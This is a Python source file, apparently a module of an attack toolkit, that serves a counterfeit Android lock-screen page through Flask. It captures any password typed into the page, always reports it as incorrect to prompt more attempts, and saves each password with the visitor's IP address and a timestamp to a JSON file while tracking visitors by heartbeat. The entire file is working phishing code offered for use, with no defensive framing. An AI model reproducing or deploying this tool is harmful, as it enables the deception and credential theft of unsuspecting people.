import os
import sys
import json
import time
from flask import Flask, render_template_string, request, jsonify
from core.promptui import *

app = Flask(__name__)
DATA_JSON_FILE = "password_captures.json"
active_visitors = {}

ANDROID_PASSWORD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Android Device Lock Screen</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            user-select: none;
            -webkit-user-select: none;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-between min-h-screen py-16 px-6">
    <div class="text-center mt-6">
        <div class="text-5xl font-light mb-2 tracking-wide" id="clock">12:00</div>
        <div class="text-sm text-gray-400 font-medium">Enter password to unlock device</div>
    </div>

    <div class="w-full max-w-xs flex flex-col items-center space-y-6 my-auto">
        <div class="w-16 h-16 bg-gray-800 rounded-full flex items-center justify-center shadow-lg border border-gray-700 mb-2">
            <svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
            </svg>
        </div>

        <form id="unlock-form" class="w-full space-y-4">
            <div class="relative">
                <input type="password" id="password-input" required autofocus
                       class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-xl text-white text-center text-lg tracking-widest focus:outline-none focus:border-blue-500 transition shadow-inner"
                       placeholder="Password" />
            </div>
            <div id="error-msg" class="text-red-400 text-xs text-center hidden">Incorrect password</div>
            <button type="submit" id="submit-btn" class="hidden">Submit</button>
        </form>
    </div>

    <div class="text-xs text-gray-500 mb-4 tracking-wider uppercase font-semibold">Emergency Call</div>

    <script>
        function updateClock() {
            const now = new Date();
            let hours = now.getHours();
            let minutes = now.getMinutes();
            minutes = minutes < 10 ? '0' + minutes : minutes;
            document.getElementById('clock').innerText = `${hours}:${minutes}`;
        }
        setInterval(updateClock, 1000);
        updateClock();

        const form = document.getElementById('unlock-form');
        const passwordInput = document.getElementById('password-input');
        const errorMsg = document.getElementById('error-msg');

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const pwd = passwordInput.value.trim();
            if (!pwd) return;

            passwordInput.disabled = true;

            fetch('/capture-password', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: pwd })
            })
            .then(res => res.json())
            .then(data => {
                setTimeout(() => {
                    errorMsg.classList.remove('hidden');
                    passwordInput.disabled = false;
                    passwordInput.value = '';
                    passwordInput.focus();
                }, 1000);
            })
            .catch(err => {
                passwordInput.disabled = false;
            });
        });

        setInterval(function() {
            navigator.sendBeacon('/heartbeat');
        }, 5000);
    </script>
</body>
</html>
"""

def save_capture(data):
    records = []
    if os.path.exists(DATA_JSON_FILE):
        try:
            with open(DATA_JSON_FILE, "r") as f:
                records = json.load(f)
        except:
            pass
    records.append(data)
    with open(DATA_JSON_FILE, "w") as f:
        json.dump(records, f, indent=4)

@app.route('/')
def index():
    return render_template_string(ANDROID_PASSWORD_TEMPLATE)

@app.route('/capture-password', methods=['POST'])
def capture_password():
    req = request.get_json()
    ip = request.remote_addr
    password = req.get('password', 'N/A')
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    print(f"\n{PromptUi.result} [PASSWORD CAPTURED] IP: {ip} | Password: \033[1;32m{password}\033[0m | Time: {timestamp}")
    save_capture({"ip": ip, "password": password, "timestamp": timestamp})
    return jsonify({"status": "success"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    ip = request.remote_addr
    if ip not in active_visitors:
        print(f"{PromptUi.result} New Visitor Detected -> {ip}")
    active_visitors[ip] = time.time()
    return "", 204

class Module:
    def __init__(self):
        self.info = {
            'name': 'Android Lock Screen Password Phishing',
            'description': 'Generates an authentic Android mobile lock screen password verification page.',
            'author': 'Quwais',
            'options': {
                'PORT': {
                    'default': '8080',
                    'required': True,
                    'desc': 'Local port to run the phishing server'
                }
            }
        }

    def run(self, options):
        try:
            port = int(options.get('PORT', 8080))
        except ValueError:
            port = 8080

        if os.geteuid() != 0:
            print(f"{PromptUi.error} This module requires root access.")
            return

        print(f"{PromptUi.info} Starting Android Lock Screen Password Phishing server...")
        print(f"{PromptUi.info} Listening on port {port}...")
        print(f"{PromptUi.result} Waiting for visitor interaction...\n")

        try:
            app.run(host='0.0.0.0', port=port, debug=False)
        except Exception as e:
            print(f"{PromptUi.error} Error running server: {e}")
